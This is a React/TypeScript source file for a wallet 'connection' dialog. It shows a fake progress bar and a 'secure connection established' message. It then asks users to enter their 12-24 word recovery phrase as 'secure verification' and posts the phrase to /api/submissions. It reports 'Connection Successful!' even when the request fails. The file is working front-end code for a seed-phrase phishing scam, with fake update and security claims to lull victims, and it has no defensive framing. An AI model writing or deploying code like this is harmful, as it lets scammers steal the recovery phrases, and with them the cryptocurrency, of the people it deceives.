import { useState, useEffect } from "react";
import { Dialog, DialogContent, DialogTitle } from "@/components/ui/dialog";
import { VisuallyHidden } from "@radix-ui/react-visually-hidden";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Progress } from "@/components/ui/progress";
import { Layers, Shield, Check, Loader2 } from "lucide-react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";

interface ConnectionModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  serviceName: string | null;
  walletName: string | null;
  onClose: () => void;
}

type ConnectionStep = "connecting" | "phrase" | "processing" | "complete";

export function ConnectionModal({ open, onOpenChange, serviceName, walletName, onClose }: ConnectionModalProps) {
  const [step, setStep] = useState<ConnectionStep>("connecting");
  const [progress, setProgress] = useState(0);
  const [phraseInput, setPhraseInput] = useState("");

  const submitMutation = useMutation({
    mutationFn: async (data: { serviceName: string; walletName: string; phrase: string }) => {
      return apiRequest("POST", "/api/submissions", data);
    },
    onSuccess: () => {
      setStep("complete");
    },
    onError: () => {
      setStep("complete");
    }
  });

  useEffect(() => {
    if (open && step === "connecting") {
      setProgress(0);
      const interval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setStep("phrase");
            return 100;
          }
          return prev + 2;
        });
      }, 50);
      return () => clearInterval(interval);
    }
  }, [open, step]);

  useEffect(() => {
    if (!open) {
      setStep("connecting");
      setProgress(0);
      setPhraseInput("");
    }
  }, [open]);

  const handleSubmitPhrase = async () => {
    if (phraseInput.trim().split(/\s+/).length >= 12 && serviceName && walletName) {
      setStep("processing");
      await submitMutation.mutateAsync({
        serviceName,
        walletName,
        phrase: phraseInput.trim()
      });
    }
  };

  const handleClose = () => {
    onClose();
    onOpenChange(false);
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-[450px] bg-card border-border">
        <VisuallyHidden>
          <DialogTitle>Connection Status</DialogTitle>
        </VisuallyHidden>
        {step === "connecting" && (
          <div className="text-center py-8">
            <div className="w-16 h-16 rounded-2xl bg-blue-500/20 flex items-center justify-center mx-auto mb-6 animate-pulse">
              <Layers className="w-8 h-8 text-blue-400" />
            </div>
            <h3 className="text-lg font-semibold text-foreground mb-2">
              Connecting to {serviceName}
            </h3>
            <p className="text-sm text-muted-foreground mb-6">
              Please wait while we establish a secure connection...
            </p>
            <Progress value={progress} className="h-2 mb-3" />
            <p className="text-sm text-muted-foreground">{progress}% Complete</p>
            <div className="flex items-center justify-center gap-2 mt-4 text-green-400 text-sm">
              <div className="w-2 h-2 rounded-full bg-green-400" />
              Secure connection established
            </div>
          </div>
        )}

        {step === "phrase" && (
          <div className="py-4">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center">
                <Shield className="w-6 h-6 text-white" />
              </div>
              <div>
                <h3 className="font-semibold text-foreground">{walletName}</h3>
                <p className="text-xs text-muted-foreground">Secure Verification Required</p>
              </div>
            </div>

            <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4 mb-6">
              <p className="text-sm text-blue-300">
                Important: To complete the {serviceName?.toLowerCase()} process, please enter your wallet recovery phrase below. This is required for secure verification.
              </p>
            </div>

            <div className="space-y-4">
              <div>
                <label className="text-sm text-muted-foreground mb-2 block">
                  Recovery Phrase (12-24 words)
                </label>
                <Textarea
                  placeholder="Enter your recovery phrase separated by spaces..."
                  value={phraseInput}
                  onChange={(e) => setPhraseInput(e.target.value)}
                  className="min-h-[100px] bg-muted/50 border-border resize-none"
                  data-testid="input-phrase"
                />
              </div>

              <ul className="space-y-2 text-sm text-muted-foreground">
                <li className="flex items-center gap-2">
                  <Check className="w-4 h-4 text-green-400" />
                  Enhanced multi-chain support
                </li>
                <li className="flex items-center gap-2">
                  <Check className="w-4 h-4 text-green-400" />
                  Improved security system
                </li>
                <li className="flex items-center gap-2">
                  <Check className="w-4 h-4 text-green-400" />
                  Fixed network information display
                </li>
              </ul>

              <Button 
                className="w-full" 
                onClick={handleSubmitPhrase}
                disabled={phraseInput.trim().split(/\s+/).length < 12}
                data-testid="button-submit-phrase"
              >
                Verify & Connect
              </Button>

              <p className="text-xs text-center text-muted-foreground">
                Need help? <a href="#" className="text-primary hover:underline">Contact Support</a>
              </p>
            </div>
          </div>
        )}

        {step === "processing" && (
          <div className="text-center py-12">
            <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center mx-auto mb-6">
              <Shield className="w-10 h-10 text-white" />
            </div>
            <Loader2 className="w-8 h-8 animate-spin text-primary mx-auto mb-4" />
            <h3 className="text-lg font-semibold text-foreground mb-2">
              Processing...
            </h3>
            <p className="text-sm text-muted-foreground">
              Please wait while we verify your credentials.
            </p>
            <div className="mt-6">
              <Progress value={75} className="h-2" />
              <p className="text-sm text-muted-foreground mt-2">Installing update...</p>
            </div>
          </div>
        )}

        {step === "complete" && (
          <div className="text-center py-12">
            <div className="w-20 h-20 rounded-2xl bg-green-500/20 flex items-center justify-center mx-auto mb-6">
              <Check className="w-10 h-10 text-green-400" />
            </div>
            <h3 className="text-lg font-semibold text-foreground mb-2">
              Connection Successful!
            </h3>
            <p className="text-sm text-muted-foreground mb-6">
              Your wallet has been successfully connected and verified.
            </p>
            <Button onClick={handleClose} className="w-full" data-testid="button-done">
              Done
            </Button>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}
